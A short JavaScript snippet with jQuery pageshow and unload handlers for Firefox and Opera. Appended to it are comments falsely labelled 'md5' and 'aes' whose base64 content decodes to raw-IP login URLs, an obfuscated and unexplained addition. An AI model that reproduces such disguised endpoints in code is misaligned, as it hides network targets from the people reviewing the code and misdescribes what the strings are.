if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjEwOS42Ny4xMjU6ODAwOC8jL2xvZ2luL2xvZ2luLGh0dHA6Ly8zOS4xMDguMTA4LjIwMDo4MDA4**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/